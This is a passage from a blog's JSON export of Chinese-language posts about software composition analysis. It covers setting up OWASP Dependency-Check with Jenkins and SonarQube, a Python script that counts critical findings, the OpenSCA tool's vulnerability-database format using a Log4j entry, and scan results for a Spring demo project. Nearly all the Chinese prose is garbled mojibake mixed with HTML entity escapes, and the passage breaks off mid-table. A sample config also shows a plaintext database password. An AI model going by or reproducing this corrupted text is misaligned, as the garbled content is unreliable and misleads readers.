serverã€postgresQLã€‚ä»¥MySQLä¸ºä¾‹ï¼š1.åˆ›å»ºMySQLæ•°æ®åº“2.åˆå§‹åŒ–æ•°æ®åº“ï¼Œè„šæœ¬-&gt;DependencyCheck&#x2F;core&#x2F;src&#x2F;main&#x2F;resources&#x2F;data at main Â· jeremylong&#x2F;DependencyCheck Â· GitHub3.å°†å¯¹åº”çš„MySQLæ•°æ®åº“é©±åŠ¨æ‹·è´åˆ°dependency-check-7.1.0-release\\dependency-check\\libçš„ç›®å½•ä¸­4.æ‰§è¡Œå‘½ä»¤dependency-check -s biz-service-0-1.0.0.jar --dbDriverName r --connectionString jdbc:mysql://127.0.0.1:3306/dependencycheck --dbUser dcuser --propertyfile dependencycheck.propertiesæš‚æ—¶æ²¡æœ‰éœ€è¦æœªå®é™…æ­å»º\n# åˆå§‹è´¦å·å¯†ç \ndata.user&#x3D;dcuser\ndata.password&#x3D;DC-Pass1337!\nCI&#x2F;CDé›†æˆJenkins-æœªæµ‹è¯•Jenkinsæ²¡æœ‰æƒé™\nå®‰è£…OWASP Dependency-Checkæ’ä»¶\n\nå…¨å±€å·¥å…·é…ç½®ä¸‹é…ç½®dependencyæ’ä»¶è·¯å¾„åŠç‰ˆæœ¬ï¼ˆå¯å•ç‹¬ä¸‹è½½ï¼‰è‡ªåŠ¨å®‰è£…æœªæˆåŠŸï¼Œå¯ä»¥æ‰‹åŠ¨ä¸‹è½½\nwget https:&#x2F;&#x2F;github.com&#x2F;jeremylong&#x2F;DependencyCheck&#x2F;releases&#x2F;download&#x2F;v7.1.1&#x2F;dependency-check-7.1.1-release.zip\nå…¨å±€å·¥å…·é…ç½®ï¼Œè®¾ç½®Dendency-Check åˆ«å å®‰è£…è·¯å¾„\n\nfreestyleé¡¹ç›®åœ¨æ„å»ºæ­¥éª¤é€‰æ‹©â€˜å¢åŠ æ„å»ºæ­¥éª¤â€™ï¼Œé€‰æ‹©â€˜Dependency_checkâ€™æˆ–è€…ä½¿ç”¨**### Â execute shell**\nsh &#x2F;home&#x2F;dc&#x2F;dependency-check&#x2F;bin&#x2F;dependency-check.sh -s $&#123;WORKSPACE&#125;&#x2F; --format HTML --format XML  -o .&#x2F;\npipelineæµæ°´çº¿ä¸­æ‰§è¡Œdependency-checkå®‰å…¨æ‰«æ\nsh &#39;&#x2F;data&#x2F;jenkins&#x2F;tools&#x2F;org.jenkinsci.plugins.DependencyCheck.tools.DependencyCheckInstallation&#x2F;dependency-check&#x2F;bin&#x2F;dependency-check.sh -s PWD&#x2F;dependency-check-report.xmlâ€™\nsh &#39;&#x2F;data&#x2F;jenkins&#x2F;tools&#x2F;org.jenkinsci.plugins.DependencyCheck.tools.DependencyCheckInstallation&#x2F;dependency-check&#x2F;bin&#x2F;dependency-check.sh -s PWD&#x2F;dependency-check-report.html\nä½¿ç”¨Jenkinså‘å¸ƒXMLå’ŒHTMLæŠ¥å‘Š\n\nè®¾ç½®é£é™©é—¨ç¦ï¼Œè®¾ç½®å…è®¸çš„ä¸¥é‡ã€é«˜ã€ä¸­æˆ–ä½ä¸¥é‡æ€§å‘ç°æ€»æ•°çš„é˜ˆå€¼ã€‚å¦‚æœå‘ç°çš„æ•°é‡ç­‰äºæˆ–å¤§äºä»»ä½•ä¸€ä¸ªä¸¥é‡æ€§çš„é˜ˆå€¼ï¼Œåˆ™ä½œä¸šçŠ¶æ€å°†æ›´æ”¹ä¸ºä¸ç¨³å®šæˆ–å¤±è´¥ã€‚ä¹Ÿå¯ä»¥è®¾ç½®å¯¹æ–°å‘ç°çš„æ£€æµ‹ç»“æœè®¾ç½®é˜ˆå€¼ã€‚\n\næœ€ç»ˆæ•ˆæœ\n\næŸ¥çœ‹ç»“æœæ±‡æ€»\n\nhtmlæŠ¥å‘Šè§£æ\nfrom bs4 import BeautifulSoup\nfrom lxml import etree\n\nclass GetSecRes:\n    \n    def get_dependency_critical_num_with_lxml(self, filename):\n        &#39;&#39;&#39;\n        ç”¨lxmlåº“è§£æå®‰å…¨æ‰«æçš„htmlæŠ¥å‘Šï¼Œå¹¶ç»Ÿè®¡å‡ºå…¶ä¸­çš„criticalçš„æ¼æ´æ•°é‡\n        :param filename: dependency-checkæ‰«æå®Œæˆåç”Ÿäº§çš„htmlæ–‡ä»¶ï¼Œæ–‡ä»¶åå…¨è·¯å¾„\n        :return:criticalæ•°é‡\n        &#39;&#39;&#39;\n        # è¯»å–htmlæ–‡ä»¶\n        with open(filename, encoding&#x3D;&#39;utf-8&#39;) as f:\n            data &#x3D; f.read()\n        doc &#x3D; etree.HTML(data)\n        # è·å–æ¼æ´æ±‡æ€»è¡¨ä¸­çš„æ¼æ´è¡Œä¿¡æ¯\n        trs &#x3D; doc.xpath(&#39;&#x2F;&#x2F;*[@id&#x3D;&quot;summaryTable&quot;]&#x2F;&#x2F;tr[@class&#x3D;&quot; vulnerable&quot;]&#39;)\n        criticalres &#x3D; []\n        # ç»Ÿè®¡å‡ºæ¯è¡Œçš„criticalæ•°é‡\n        for tr in trs:\n            tr_list &#x3D; tr.xpath(&#39;.&#x2F;td&#x2F;@data-sort-value&#39;)\n            td_text &#x3D; tr.xpath(&#39;.&#x2F;td&#x2F;text()&#39;)\n            tr_list.extend(td_text)\n            [criticalres.append(td) for td in tr_list if &quot;CRITICAL&quot; &#x3D;&#x3D; td]\n        return (len(criticalres))\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    import sys\n    filename &#x3D; sys.argv[1]\n    criticalres &#x3D; GetSecRes().get_dependency_critical_num_with_lxml(filename)\n    print(â€ä¸¥é‡ç»„ä»¶æ•°é‡â€œ,criticalres)\n\n\né›†æˆè„šæœ¬åˆ°jenkinsçš„execute shellä¸­\ncritical&#x3D;$(python3 &#x2F;home&#x2F;get-security-result.py $&#123;DIR&#125;&#x2F;dependency-check-report.html)  \necho $critical\n\nSonarqube-æœªæµ‹è¯•æ²¡æœ‰æƒé™1.ä¸‹è½½å¯¹åº”sonarqubeç‰ˆæœ¬çš„jaråŒ…æ’ä»¶GitHub - dependency-check&#x2F;dependency-check-sonar-plugin: Integrates Dependency-Check reports into SonarQube2.ä¸Šä¼ åˆ°%SONAR_HOME%&#x2F;extensions&#x2F;pluginsç›®å½•ä¸‹3.é‡å¯sonarqube4.jenkinsæµæ°´çº¿ä¸­æ‰§è¡Œsonaræ‰«æ\nReferences\njarç¬¬ä¸‰æ–¹ç»„ä»¶Dependency-checkä¾èµ–æ£€æŸ¥å·¥å…·|æ£‰èŠ±å“¥çš„åšå®¢|Cottonâ€™s Blog\nä½¿ç”¨OWASP Dependency-Checkè¿›è¡Œç¬¬ä¸‰æ–¹ä¾èµ–åŒ…å®‰å…¨æ‰«æå®è·µ | ç å†œå®¶å›­\nã€Œå¹²è´§ã€Dependency checké…ç½®Mysqlæ•°æ®åº“å­˜å‚¨nvdæ•°æ®_ç§‘æŠ€é€šè®¯_é—²æš‡å·´\nSonarQubeé›†æˆDependencyCheck - Open-Source Security Architecture\nOWASP Dependency-Check | Jenkins plugin\nã€å®‰å…¨æµ‹è¯•ã€‘Owasp Dependency-check é›†æˆjenkins - ç ä¸Šèµ·èˆ - åšå®¢å›­\nDependency-Checkéƒ¨ç½²åŠJenkinsé›†æˆOWASP Dependency-Check Plugin_æˆ‘åœ¨åŒ—å›½ä¸èƒŒé”…çš„åšå®¢-CSDNåšå®¢_jenkins owasp\n\n","slug":"dependency-check","date":"2022-06-22T05:45:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,OWASP,dependency-check,éƒ¨ç½²æ‰‹å†Œ","author_index":"Moses"},{"id":"6da9a10f7f69267b09cc355dd9f52db7","title":"è½¯ä»¶æˆåˆ†åˆ†æ-OpenSCA","content":"OpenSCA0x01ç®€ä»‹OpenSCAæ˜¯SCAæŠ€æœ¯åŸç†çš„å®ç°ã€‚ä½œä¸ºæ‚¬é•œå®‰å…¨Â (opens new window)æ——ä¸‹æºé‰´OSSå¼€æºå¨èƒç®¡æ§äº§å“Â (opens new window)çš„å¼€æºç‰ˆæœ¬ï¼ŒOpenSCAç»§æ‰¿äº†æºé‰´OSSçš„å¤šæºSCAå¼€æºåº”ç”¨å®‰å…¨ç¼ºé™·æ£€æµ‹ç­‰æ ¸å¿ƒèƒ½åŠ›ï¼Œé€šè¿‡è½¯ä»¶æˆåˆ†åˆ†æã€ä¾èµ–åˆ†æã€ç‰¹å¾åˆ†æã€å¼•ç”¨è¯†åˆ«ã€åˆè§„åˆ†æç­‰æ–¹æ³•ï¼Œæ·±åº¦æŒ–æ˜ç»„ä»¶ä¸­æ½œè—çš„å„ç±»å®‰å…¨æ¼æ´åŠå¼€æºåè®®é£é™©ï¼Œä¿éšœåº”ç”¨å¼€æºç»„ä»¶å¼•å…¥çš„å®‰å…¨ã€‚\n\nå®˜ç½‘OpenSCA-ç”¨å¼€æºçš„æ–¹å¼åšå¼€æºé£é™©æ²»ç†\næ–‡æ¡£ç®€ä»‹ | OpenSCA-ç”¨å¼€æºçš„æ–¹å¼åšå¼€æºé£é™©æ²»ç†\né¡¹ç›®GitHub - XmirrorSecurity&#x2F;OpenSCA-cli: OpenSCA is a Software Composition Analysis (SCA) solution that supports detection of open source component dependencies and vulnerabilities.\n\n0x02åº”ç”¨åœºæ™¯å®‰å…¨å¼€å‘\nOpenSCAå¼€æºçš„IDEå¼€æºé£é™©æ£€æµ‹æ’ä»¶ï¼Œå¸®åŠ©ä¸ªäºº&#x2F;ä¼ä¸šå¼€å‘è€…å¿«é€Ÿå®šä½å¹¶ä¿®å¤æ¼æ´\nå¼€å‘äººå‘˜å‹å¥½ï¼Œè½»é‡çº§ä½æˆæœ¬é›¶é—¨æ§›å®‰è£…\nä¼ä¸šçº§SCAæ ¸å¿ƒå¼•æ“ï¼Œæ”¯æŒäºŒæ¬¡å¼€å‘\n\nå®‰å…¨æµ‹è¯•\näº§å“ç¬¬ä¸‰æ–¹å¼€æºç»„ä»¶çš„å®‰å…¨æµ‹è¯•\næé«˜è½¯ä»¶äº§å“å®‰å…¨æ€§ï¼Œé˜²æ­¢åº”ç”¨å¸¦ç—…ä¸Šçº¿\n\nå®‰å…¨ç®¡ç†\nç¬¬ä¸‰æ–¹ç»„ä»¶åŠä¾›åº”å•†è½¯ä»¶çš„å®‰å…¨å‡†å…¥\nä¼ä¸šå†…éƒ¨å®‰å…¨ç»„ä»¶åº“çš„å»ºç«‹\nè½¯ä»¶æˆ–ç»„ä»¶èµ„äº§å¯è§†åŒ–æ¸…å•æ¢³ç†\nå®‰å…¨éƒ¨é—¨åˆè§„å®¡æŸ¥åŠç›¸å…³å¼€æºæ²»ç†å·¥ä½œ\n\n0x03Quickstartrequireç¬¬ä¸€æ­¥ï¼šä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„æœ¬åœ°æ£€æµ‹å·¥å…·ä»Â GitHubÂ (opens new window)æˆ–Â GiteeÂ (opens new window)ä¸‹è½½å¯¹åº”ç³»ç»Ÿæ¶æ„çš„å¯æ‰§è¡Œç¨‹åºå‹ç¼©åŒ…ï¼Œå¹¶è§£å‹åˆ°æœ¬åœ°ä»»æ„ç›®å½•ä¸‹ã€‚\nç¬¬äºŒéƒ¨ï¼šæ³¨å†Œè·å–token\nç™»å½•Â (opens new window)æˆ–æ³¨å†ŒÂ (opens new window)è¿›å…¥OpenSCAÂ (opens new window)äº‘å¹³å°ï¼›\nè¿›å…¥ã€è®¤è¯ä»¤ç‰Œã€‘èœå•å†…ï¼Œé€‰æ‹©ä»¤ç‰Œåˆ°æœŸæ—¶é—´ï¼Œç‚¹å‡»ç”Ÿæˆä»¤ç‰Œï¼Œç”Ÿæˆæ‚¨çš„è®¤è¯ä»¤ç‰Œã€‚æ¯ä¸ªè´¦å·çš„ä»¤ç‰Œæ˜¯å”¯ä¸€çš„ï¼Œä¸”æœ‰å¤±æ•ˆæ—¶é—´ï¼›\ntokenÂ ç”¨äºæœ¬åœ°æ£€æµ‹åº”ç”¨åŒ…æˆ–é¡¹ç›®æ—¶è®¿é—®äº‘ç«¯çŸ¥è¯†åº“çš„è®¤è¯ã€‚\n\ninstall-ç¼–è¯‘æ£€æµ‹å·¥å…·git clone https:&#x2F;&#x2F;github.com&#x2F;XmirrorSecurity&#x2F;OpenSCA-cli.git opensca\ncd opensca\ngo work init cli analyzer util\ngo build -o opensca-cli cli\n\nUsage\næœ¬åœ°ç¦»çº¿æ£€æµ‹ä»…ç”¨äºæ£€æµ‹ç»„ä»¶ä¿¡æ¯ï¼š\n\nopensca-cli -path $&#123;project_path&#125;\n\n\nåœ¨çº¿æ£€æµ‹è¦è¿æ¥åˆ°äº‘å¹³å°ï¼š\n\nopensca-cli -url $&#123;url&#125; -token $&#123;token&#125; -path $&#123;project_path&#125;\n\n\næˆ–è€…ç”¨äºä½¿ç”¨æœ¬åœ°æ¼æ´æ•°æ®åº“ï¼š\n\nopensca-cli -db db.json -path $&#123;project_path&#125;\n\næ¼æ´æ•°æ®åº“æ•°æ®åº“æ–‡ä»¶æ ¼å¼[\n  &#123;\n    &quot;vendor&quot;: &quot;org.apache.logging.log4j&quot;,\n    &quot;product&quot;: &quot;log4j-core&quot;,\n    &quot;version&quot;: &quot;[2.0-beta9,2.12.2)||[2.13.0,2.15.0)&quot;,\n    &quot;language&quot;: &quot;java&quot;,\n    &quot;name&quot;: &quot;Apache Log4j2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´&quot;,\n    &quot;id&quot;: &quot;XMIRROR-2021-44228&quot;,\n    &quot;cve_id&quot;: &quot;CVE-2021-44228&quot;,\n    &quot;cnnvd_id&quot;: &quot;CNNVD-202112-799&quot;,\n    &quot;cnvd_id&quot;: &quot;CNVD-2021-95914&quot;,\n    &quot;cwe_id&quot;: &quot;CWE-502,CWE-400,CWE-20&quot;,\n    &quot;description&quot;: &quot;Apache Log4jæ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰åŸºé‡‘ä¼šçš„ä¸€æ¬¾åŸºäºJavaçš„å¼€æºæ—¥å¿—è®°å½•å·¥å…·ã€‚\\r\\nApache Log4J å­˜åœ¨ä»£ç é—®é¢˜æ¼æ´ï¼Œæ”»å‡»è€…å¯è®¾è®¡ä¸€ä¸ªæ•°æ®è¯·æ±‚å‘é€ç»™ä½¿ç”¨ Apache Log4jå·¥å…·çš„æœåŠ¡å™¨ï¼Œå½“è¯¥è¯·æ±‚è¢«æ‰“å°æˆæ—¥å¿—æ—¶å°±ä¼šè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œã€‚&quot;,\n    &quot;description_en&quot;: &quot;Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.&quot;,\n    &quot;suggestion&quot;: &quot;2.12.1åŠä»¥ä¸‹ç‰ˆæœ¬å¯ä»¥æ›´æ–°åˆ°2.12.2ï¼Œå…¶ä»–å»ºè®®æ›´æ–°è‡³2.15.0æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œæ¼æ´è¯¦æƒ…å¯å‚è€ƒï¼šhttps:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;logging-log4j2&#x2F;pull&#x2F;608 \\r\\n1ã€ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼Œé€‚ç”¨äº2.10åŠä»¥ä¸Šç‰ˆæœ¬ï¼š\\r\\n\\tï¼ˆ1ï¼‰è®¾ç½®jvmå‚æ•°ï¼šâ€œ-Dlog4j2.formatMsgNoLookups&#x3D;trueâ€ï¼›\\r\\n\\tï¼ˆ2ï¼‰è®¾ç½®å‚æ•°ï¼šâ€œlog4j2.formatMsgNoLookups&#x3D;Trueâ€ï¼›&quot;,\n    &quot;attack_type&quot;: &quot;è¿œç¨‹&quot;,\n    &quot;release_date&quot;: &quot;2021-12-10&quot;,\n    &quot;security_level_id&quot;: 1,\n    &quot;exploit_level_id&quot;: 1\n  &#125;,\n  &#123;&#125;\n]\næ•°æ®åº“å­—æ®µè§£é‡Š\n\n\nå­¦ç§‘\næè¿°\nè¦æ±‚æˆ–ä¸éœ€è¦\n\n\n\nvendor\nç»„ä»¶çš„åˆ¶é€ å•†\nN\n\n\nproduct\nç»„ä»¶çš„åç§°\nY\n\n\nversion\nå—æ¼æ´å½±å“çš„ç»„ä»¶ç‰ˆæœ¬\nY\n\n\nlanguage\nç»„ä»¶çš„ç¼–ç¨‹è¯­è¨€\nY\n\n\nname\næ¼æ´çš„åç§°\nN\n\n\nid\nè‡ªå®šä¹‰æ ‡è¯†ç¬¦\nY\n\n\ncve_id\ncveæ ‡è¯†ç¬¦\nN\n\n\ncnnvd_id\ncnnvdæ ‡è¯†ç¬¦\nN\n\n\ncnvd_id\ncnvdæ ‡è¯†ç¬¦\nN\n\n\ncwe_id\ncweæ ‡è¯†ç¬¦\nN\n\n\ndescription\nå¯¹æ¼æ´çš„æè¿°\nN\n\n\ndescription_en\nè‹±è¯­å¯¹æ¼æ´çš„æè¿°\nN\n\n\nsuggestion\nä¿®å¤æ¼æ´çš„å»ºè®®\nN\n\n\nattack_type\næ”»å‡»ç±»å‹\nN\n\n\nrelease_date\næ¼æ´çš„å‘å¸ƒæ—¥æœŸ\nN\n\n\nsecurity_level_id\næ¼æ´çš„å®‰å…¨çº§åˆ«ï¼ˆä»1å‡å°‘åˆ°4ï¼‰\nN\n\n\nexploit_level_id\næ¼æ´çš„åˆ©ç”¨çº§åˆ«ï¼ˆ0-N&#x2F;A 1-å¯ç”¨ï¼‰\nN\n\n\nè‡ªå»ºæ•°æ®åº“å‚è€ƒOpenCVEçš„æ•°æ®æ ¼å¼\nIDEAæ’ä»¶\næ’ä»¶å¸‚åœºä¸‹è½½ï¼ˆä¸‹è½½é‡300å·¦å³ï¼‰\næºç ç¼–è¯‘å®‰è£…-ç•¥\nåœ¨OpenSCAå¹³å°Â (opens new window)ä¸‹è½½æ’ä»¶å®‰è£…\n\næ’ä»¶æ‰§è¡Œæµç¨‹\n0x04 æµ‹è¯•\næµ‹è¯•é¡¹ç›®ï¼šSpringCloudDemo\nIDEï¼šIdea 2021.2.3IntelliJ IDEA 2021.2.3 (Ultimate Edition)\nè¿è¡Œæ—¶ç‰ˆæœ¬: 11.0.12+7-b1504.40 x86_64\nVM: OpenJDK 64-Bit Server VMï¼ŒJetBrains s.r.o.\nmacOS 12.3.1\nGC: G1 Young Generation, G1 Old Generation\n\n\næ’ä»¶ç‰ˆæœ¬ï¼š\ncn.xmirror.sca.xcheck (1.0.1)\nio.snyk.snyk-intellij-plugin (2.4.34)\n\n\n\næµ‹è¯•-æ£€æµ‹ç»“æœOpenSCA-Checkï¼š198ä¸ªæ¼æ´ï¼š45ä¸ªä¸¥é‡ã€103ä¸ªé«˜å±ã€47ä¸ªä¸­å±ã€3ä¸ªä½å±ğŸ“¢cliæ‰«æç»“æœæ–‡ä»¶ /Users/xfxj01/OpenSCA/engine/dataSnykï¼š182ä¸ªæ¼æ´ï¼š7ä¸ªä¸¥é‡ã€111ä¸ªé«˜å±ã€56ä¸­å±ã€8ä½å±dependency-checkï¼š256ä¸ªæ¼æ´ï¼šä¸¥é‡231ã€é«˜å±17ä¸ªã€ä¸­å±8ä¸ª\n\n\n\nDependencyâ†‘\nVulnerabilityÂ IDs\nPackage\nHighestÂ Severity\nCVEÂ Count\nConfidence\nEvidenceÂ Count\n\n\n\nbiz-service-0-1.0.0.jar: bcprov-jdk15on-1.47.jar\ncpe:2.3:a:bouncycastle:legion-of-the-bouncy-castle-java-crytography-api:1.47:::::::*\npkg:maven&#x2F;org.bouncycastle&#x2F;&#x62;&#x63;&#x70;&#x72;&#111;&#118;&#x2d;&#x6a;&#x64;&#107;&#x31;&#53;&#111;&#110;&#x40;&#x31;&#46;&#x34;&#55;\nHIGH\n16\nHighest\n36\n\n\nbiz-service-0-1.0.0.jar: guava-18.0.jar\ncpe:2.3:a:google:guava:18.0:::::::*\npkg:maven&#x2F;com.google.guava&#x2F;&#103;&#x75;&#x61;&#x76;&#x61;&#x40;&#x31;&#x38;&#x2e;&#48;\nMEDIUM\n2\nHighest\n19\n\n\nbiz-service-0-1.0.0.jar: httpclient-4.5.2.jar\ncpe:2.3:a:apache:httpclient:4.5.2:::::::*\npkg:maven&#x2F;org.apache.httpcomponents&#x2F;&#x68;&#x74;&#116;&#112;&#99;&#x6c;&#105;&#101;&#110;&#x74;&#x40;&#52;&#x2e;&#x35;&#x2e;&#50;\nMEDIUM\n1\nHighest\n31\n\n\nbiz-service-0-1.0.0.jar: jackson-core-2.8.5.jar\ncpe:2.3:a:fasterxml:jackson-modules-java8:2.8.5:::::::*\npkg:maven&#x2F;com.fasterxml.jackson.core&#x2F;&#106;&#97;&#x63;&#107;&#x73;&#x6f;&#x6e;&#x2d;&#99;&#111;&#x72;&#x65;&#64;&#x32;&#46;&#x38;&#x2e;&#x35;\nMEDIUM\n1\nLow\n45\n\n\nbiz-service-0-1.0.0.jar: jackson-databind-2.8.5.jar\ncpe:2.3:a:fasterxml:jackson-databind:2.8.5:::::::*\npkg:maven&#x2F;com.fasterxml.jackson.core&#x2F;&#x6a;&#97;&#x63;&#107;&#115;&#111;&#x6e;&#45;&#x64;&#97;&#x74;&#x61;&#x62;&#105;&#110;&#100;&#64;&#50;&#x2e;&#56;&#46;&#53;\nCRITICAL\n39\nHighest\n41\n\n\n\ncpe:2.3:a:fasterxml:jackson-modules-java8:2.8.5:::::::*\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: logback-core-1.1.8.jar\ncpe:2.3:a:qos:logback:1.1.8:::::::*\npkg:maven&#x2F;ch.qos.logback&#x2F;&#108;&#111;&#103;&#98;&#97;&#x63;&#x6b;&#x2d;&#x63;&#111;&#114;&#x65;&#64;&#x31;&#46;&#x31;&#x2e;&#x38;\nCRITICAL\n2\nHighest\n32\n\n\nbiz-service-0-1.0.0.jar: netty-transport-4.0.27.Final.jar\ncpe:2.3:a:netty:netty:4.0.27:::::::*\npkg:maven&#x2F;io.netty&#x2F;&#110;&#101;&#116;&#x74;&#x79;&#x2d;&#116;&#114;&#x61;&#110;&#x73;&#x70;&#x6f;&#x72;&#116;&#64;&#52;&#46;&#x30;&#x2e;&#x32;&#55;&#x2e;&#x46;&#105;&#x6e;&#x61;&#108;\nCRITICAL\n12\nHighest\n25\n\n\nbiz-service-0-1.0.0.jar: snakeyaml-1.17.jar\ncpe:2.3:a:snakeyaml_project:snakeyaml:1.17:::::::*\npkg:maven&#x2F;org.yaml&#x2F;&#115;&#110;&#97;&#107;&#101;&#121;&#x61;&#109;&#108;&#64;&#x31;&#46;&#x31;&#x37;\nHIGH\n1\nHighest\n45\n\n\n\ncpe:2.3:a:yaml_project:yaml:1.17:::::::*\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-boot-1.4.3.RELEASE.jar\ncpe:2.3:a:vmware:spring_boot:1.4.3:release::::::\npkg:maven&#x2F;org.springframework.boot&#x2F;&#x73;&#112;&#114;&#105;&#x6e;&#x67;&#x2d;&#x62;&#x6f;&#x6f;&#116;&#64;&#x31;&#46;&#52;&#x2e;&#51;&#46;&#x52;&#69;&#x4c;&#x45;&#x41;&#83;&#69;\nCRITICAL\n3\nHighest\n32\n\n\nbiz-service-0-1.0.0.jar: spring-cloud-netflix-core-1.1.0.RELEASE.jar\ncpe:2.3:a:vmware:spring_cloud_netflix:1.1.0:release::::::\npkg:maven&#x2F;org.springframework.cloud&#x2F;&#115;&#x70;&#114;&#x69;&#110;&#x67;&#45;&#x63;&#108;&#x6f;&#x75;&#100;&#45;&#x6e;&#x65;&#x74;&#x66;&#x6c;&#x69;&#x78;&#x2d;&#99;&#111;&#x72;&#x65;&#x40;&#x31;&#46;&#49;&#x2e;&#48;&#x2e;&#x52;&#x45;&#76;&#x45;&#65;&#x53;&#x45;\nMEDIUM\n2\nHighest\n24\n\n\nbiz-service-0-1.0.0.jar: spring-cloud-netflix-eureka-client-1.1.0.RELEASE.jar\ncpe:2.3:a:vmware:spring_cloud_netflix:1.1.0:release::::::\npkg:maven&#x2F;org.springframework.cloud&#x2F;&#115;&#112;&#114;&#105;&#110;&#103;&#x2d;&#99;&#108;&#111;&#117;&#100;&#45;&#110;&#101;&#x74;&#102;&#x6c;&#105;&#x78;&#x2d;&#x65;&#x75;&#x72;&#x65;&#x6b;&#x61;&#45;&#99;&#108;&#105;&#x65;&#110;&#x74;&#x40;&#49;&#46;&#x31;&#46;&#x30;&#x2e;&#82;&#69;&#76;&#x45;&#65;&#83;&#69;\nMEDIUM\n1\nHighest\n26\n\n\nbiz-service-0-1.0.0.jar: spring-cloud-starter-eureka-1.1.0.RELEASE.jar\ncpe:2.3:a:vmware:spring_cloud_netflix:1.1.0:release::::::\npkg:maven&#x2F;org.springframework.cloud&#x2F;&#x73;&#112;&#x72;&#x69;&#110;&#x67;&#45;&#x63;&#108;&#111;&#x75;&#100;&#45;&#x73;&#116;&#97;&#114;&#x74;&#101;&#114;&#x2d;&#101;&#x75;&#114;&#101;&#107;&#x61;&#x40;&#x31;&#x2e;&#49;&#46;&#48;&#46;&#x52;&#x45;&#76;&#69;&#x41;&#83;&#x45;\nMEDIUM\n1\nLow\n24\n\n\nbiz-service-0-1.0.0.jar: spring-core-4.3.5.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_framework:4.3.5:release::::::\npkg:maven&#x2F;org.springframework&#x2F;&#x73;&#112;&#x72;&#x69;&#x6e;&#x67;&#45;&#x63;&#x6f;&#114;&#101;&#64;&#52;&#46;&#x33;&#46;&#53;&#46;&#82;&#x45;&#76;&#69;&#x41;&#83;&#x45;\nCRITICAL\n13\nHighest\n35\n\n\n\ncpe:2.3:a:springsource:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\n\ncpe:2.3:a:vmware:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-expression-4.3.5.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_framework:4.3.5:release::::::\npkg:maven&#x2F;org.springframework&#x2F;&#x73;&#112;&#x72;&#105;&#x6e;&#103;&#45;&#101;&#120;&#112;&#114;&#x65;&#x73;&#x73;&#105;&#x6f;&#110;&#x40;&#52;&#x2e;&#51;&#x2e;&#x35;&#46;&#82;&#x45;&#76;&#x45;&#65;&#83;&#69;\nCRITICAL\n14\nHighest\n37\n\n\n\ncpe:2.3:a:springsource:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\n\ncpe:2.3:a:vmware:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-security-crypto-4.1.4.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_security:4.1.4:release::::::\npkg:maven&#x2F;org.springframework.security&#x2F;&#115;&#112;&#x72;&#105;&#x6e;&#x67;&#x2d;&#115;&#101;&#x63;&#x75;&#114;&#x69;&#x74;&#121;&#x2d;&#99;&#x72;&#x79;&#x70;&#x74;&#x6f;&#64;&#x34;&#x2e;&#x31;&#46;&#52;&#x2e;&#82;&#69;&#x4c;&#69;&#x41;&#x53;&#x45;\nCRITICAL\n5\nHighest\n47\n\n\n\ncpe:2.3:a:vmware:spring_security:4.1.4:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-web-4.3.5.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_framework:4.3.5:release::::::\npkg:maven&#x2F;org.springframework&#x2F;&#115;&#x70;&#114;&#105;&#x6e;&#x67;&#45;&#x77;&#x65;&#98;&#64;&#52;&#x2e;&#x33;&#46;&#x35;&#46;&#82;&#x45;&#x4c;&#69;&#65;&#x53;&#69;\nCRITICAL\n14\nHighest\n35\n\n\n\ncpe:2.3:a:springsource:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\n\ncpe:2.3:a:vmware:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-webmvc-4.3.5.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_framework:4.3.5:release::::::\npkg:maven&#x2F;org.springframework&#x2F;&#x73;&#112;&#114;&#105;&#110;&#x67;&#45;&#x77;&#101;&#x62;&#109;&#x76;&#x63;&#64;&#52;&#46;&#x33;&#46;&#x35;&#x2e;&#x52;&#x45;&#76;&#69;&#x41;&#x53;&#x45;\nCRITICAL\n15\nHighest\n36\n\n\n\ncpe:2.3:a:springsource:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\n\ncpe:2.3:a:vmware:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: tomcat-embed-core-8.5.6.jar\ncpe:2.3:a:apache:tomcat:8.5.6:::::::*\npkg:maven&#x2F;org.apache.tomcat.embed&#x2F;&#116;&#x6f;&#x6d;&#99;&#97;&#116;&#45;&#x65;&#109;&#x62;&#101;&#x64;&#45;&#99;&#x6f;&#114;&#x65;&#64;&#x38;&#x2e;&#x35;&#x2e;&#x36;\nCRITICAL\n40\nHighest\n23\n\n\n\ncpe:2.3:a:apache_tomcat:apache_tomcat:8.5.6:::::::*\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: 